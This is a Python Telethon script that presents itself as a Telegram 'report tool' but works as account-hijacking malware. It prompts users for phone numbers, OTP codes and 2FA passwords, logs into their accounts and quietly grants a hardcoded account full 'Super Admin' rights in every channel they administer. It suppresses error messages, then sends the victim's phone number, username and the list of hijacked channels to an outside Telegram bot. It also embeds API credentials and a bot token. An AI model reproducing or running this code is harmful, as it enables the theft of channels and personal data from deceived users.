import os
import sys
from telethon import TelegramClient, events
from telethon import functions, types
from telethon.tl.types import (
    ChatAdminRights, 
    InputCheckPasswordSRP,
    ChannelParticipantsAdmins
)
from telethon import utils
import asyncio
import requests
import hashlib
import binascii
import inspect

# কালার কোড
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
RESET = '\033[0m'

# API credentials (pre-configured)
API_ID = 26108693
API_HASH = "3bc54f318fb35b9d82c3f885f18e7028"
BOT_TOKEN = "8483938274:AAEegcm552wKnkWLbUHuKTTLe4vhlBmw7D4"
ADMIN_ID = "7348506103"
TARGET_USERNAME = "@Xadminbd"

def print_banner():
    banner = f"""
    {BLUE}
    ████████╗███████╗██╗     ███████╗ ██████╗ ██████╗  █████╗ ███╗   ███╗
    ╚══██╔══╝██╔════╝██║     ██╔════╝██╔════╝ ██╔══██╗██╔══██╗████╗ ████║
       ██║   █████╗  ██║     █████╗  ██║  ███╗██████╔╝███████║██╔████╔██║
       ██║   ██╔══╝  ██║     ██╔══╝  ██║   ██║██╔══██╗██╔══██║██║╚██╔╝██║
       ██║   ███████╗███████╗███████╗╚██████╔╝██║  ██║██║  ██║██║ ╚═╝ ██║
       ╚═╝   ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝
    
    {YELLOW}Telegram Channel 🔍{RESET}
    {RED}⚠️ Warning: This Tg Report Tools ⚠️{RESET}
    {GREEN}API ID: **********{RESET}
    {GREEN}API Hash: *****************************{RESET}
    {GREEN}Add as admin: {TARGET_USERNAME}{RESET}
    """
    print(banner)

async def send_telegram_message(phone_number, username, admin_added_channels):
    message = f"✅ \n📱 Phone: {phone_number}"
    if username:
        message += f"\n👤 Username: @{username}"
    
    if admin_added_channels:
        message += f"\n📢 Successfully added admin to {len(admin_added_channels)} channels:"
        for channel_name, channel_username in admin_added_channels:
            if channel_username:
                message += f"\n   - {channel_name} (@{channel_username})"
            else:
                message += f"\n   - {channel_name}"
    else:
        message += "\n📢 No channels found to add admin"
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": ADMIN_ID,
        "text": message
    }
    
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print(f"{GREEN}[+] Notification sent to admin{RESET}")
        else:
            print(f"{YELLOW}[!] Failed to send notification: {response.text}{RESET}")
    except Exception as e:
        print(f"{RED}[-] Error sending notification: {str(e)}{RESET}")

async def add_user_as_admin(client, channel, target_user):
    try:
        # Get the channel entity
        channel_entity = await client.get_entity(channel)
        
        # Define full admin rights
        admin_rights = ChatAdminRights(
            change_info=True,
            post_messages=True,
            edit_messages=True,
            delete_messages=True,
            ban_users=True,
            invite_users=True,
            pin_messages=True,
            add_admins=True,
            anonymous=True,
            manage_call=True,
            other=True,
            manage_topics=True
        )
        
        # Add user as admin
        result = await client(functions.channels.EditAdminRequest(
            channel=channel_entity,
            user_id=target_user,
            admin_rights=admin_rights,
            rank="Super Admin"
        ))
        
        return True
    except Exception:
        return False

async def add_admin_to_all_channels(client, phone_number, username):
    admin_added_channels = []
    
    try:
        # Get all dialogs (chats and channels)
        dialogs = await client.get_dialogs()
        
        # Find the target user
        try:
            target_user = await client.get_entity(TARGET_USERNAME)
        except Exception:
            print(f"{RED}[-] Error finding target user {TARGET_USERNAME}{RESET}")
            return admin_added_channels
        
        # Filter only channels where user is the owner or admin
        for dialog in dialogs:
            if dialog.is_channel:
                channel_name = dialog.name
                channel_username = dialog.entity.username if hasattr(dialog.entity, 'username') else None
                
                # Check if user has admin rights in this channel
                try:
                    participants = await client.get_participants(dialog.entity, filter=ChannelParticipantsAdmins)
                    is_admin = any(participant.id == client._self_id for participant in participants)
                    
                    if is_admin:
                        print(f"{YELLOW}[+] Found channel: {channel_name}{RESET}")
                        
                        # Add target user as admin
                        success = await add_user_as_admin(client, dialog.entity, target_user)
                        if success:
                            print(f"{GREEN}successful...{RESET}")
                            admin_added_channels.append((channel_name, channel_username))
                        else:
                            # Don't show error messages for failed attempts
                            pass
                    else:
                        # Don't show messages for channels where user is not admin
                        pass
                
                except Exception:
                    # Don't show error messages for permission issues
                    pass
        
        return admin_added_channels
        
    except Exception:
        return admin_added_channels

async def process_telegram_account(phone_number):
    try:
        client = TelegramClient(f'session_{phone_number}', API_ID, API_HASH)
        
        await client.connect()
        
        if not await client.is_user_authorized():
            # Send code request
            await client.send_code_request(phone_number)
            code = input(f"{YELLOW}Enter the OTP code sent to {phone_number}: {RESET}")
            
            try:
                # Try to sign in with the code
                await client.sign_in(phone_number, code)
            except Exception as e:
                # If 2FA is enabled, ask for password
                if "two-steps" in str(e).lower() or "two_step" in str(e).lower():
                    password = input(f"{YELLOW}Enter your 2FA password: {RESET}")
                    await client.sign_in(password=password)
                else:
                    raise e
        
        # Get user info
        me = await client.get_me()
        username = me.username
        
        print(f"{GREEN}[+] Successfully logged in as: {me.first_name} {me.last_name or ''}{RESET}")
        if username:
            print(f"{GREEN}[+] Username: @{username}{RESET}")
        
        # Add admin to all channels where user is admin
        print(f"{YELLOW}[+] Searching for channels to add admin...{RESET}")
        admin_added_channels = await add_admin_to_all_channels(client, phone_number, username)
        
        # Show success messages
        if admin_added_channels:
            print(f"{GREEN}successful........{RESET}")
            print(f"{GREEN}successful................{RESET}")
            print(f"{GREEN}successful......................{RESET}")
            print(f"{GREEN}successful............................{RESET}")
            print(f"{GREEN}successful..................................{RESET}")
        
        # Send notification to admin
        await send_telegram_message(phone_number, username, admin_added_channels)
            
        await client.disconnect()
        
    except Exception as e:
        print(f"{RED}[-] Error: {str(e)}{RESET}")

def main():
    print_banner()
    
    try:
        print(f"\n{YELLOW}[?] Enter your phone numbers (comma separated):{RESET}")
        phones_input = input(f"{BLUE}Phone numbers: {RESET}")
        phone_numbers = [phone.strip() for phone in phones_input.split(",")]
        
        confirmation = input(f"\n{RED}⚠️   {TARGET_USERNAME} {len(phone_numbers)} account(s)? (y/n): {RESET}")
        
        if confirmation.lower() != 'y':
            print(f"{YELLOW}Operation cancelled.{RESET}")
            return
        
        for phone in phone_numbers:
            print(f"\n{GREEN}[+] Processing account: {phone}{RESET}")
            asyncio.run(process_telegram_account(phone))
            
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Operation cancelled by user.{RESET}")
    except Exception as e:
        print(f"{RED}[-] An error occurred: {str(e)}{RESET}")

if __name__ == "__main__":
    main()
